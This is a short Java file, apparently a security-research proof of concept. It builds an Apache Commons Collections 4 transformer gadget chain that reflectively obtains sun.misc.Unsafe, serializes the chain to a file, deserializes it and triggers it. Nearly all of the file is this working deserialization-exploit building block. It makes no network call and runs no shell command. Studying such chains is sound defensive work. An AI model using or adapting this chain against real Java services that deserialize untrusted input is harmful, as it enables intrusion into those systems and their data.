package com.test;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.*;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class CC_getUnsafe {
    public static void main(String[] args) throws Exception {
            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
            InvokerTransformer invokerTransformer3 = new
                    InvokerTransformer("get",new Class[]{Object.class}, new Object[]
                    {null});
            InvokerTransformer invokerTransformer2 = new
                    InvokerTransformer("setAccessible",new Class[]{boolean.class},
                    new Object[]{true});
            TransformerClosure transformerClosure = new
                    TransformerClosure(invokerTransformer2);
            ClosureTransformer ClosureTransformer = new
                    ClosureTransformer(transformerClosure);
            InvokerTransformer invokerTransformer = new
                    InvokerTransformer("getDeclaredField",new Class[]{String.class},
                    new Object[]{"theUnsafe"});
            ConstantTransformer constantTransformer = new
                    ConstantTransformer(UnsafeClass);
            Transformer[] transformers=new Transformer[]
                    {constantTransformer,invokerTransformer,ClosureTransformer,invokerTransformer3};
            Transformer keyTransformer = new
                    ChainedTransformer(transformers);
            FileOutputStream fos = new FileOutputStream("bin");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(keyTransformer);
            oos.close();
            FileInputStream fis = new FileInputStream("bin");
            ObjectInputStream ois = new ObjectInputStream(fis);
            Transformer o1 = (Transformer) ois.readObject();
            ois.close();
            Object transform = o1.transform(null);  //模拟触发
            System.out.println(transform);
    }

}
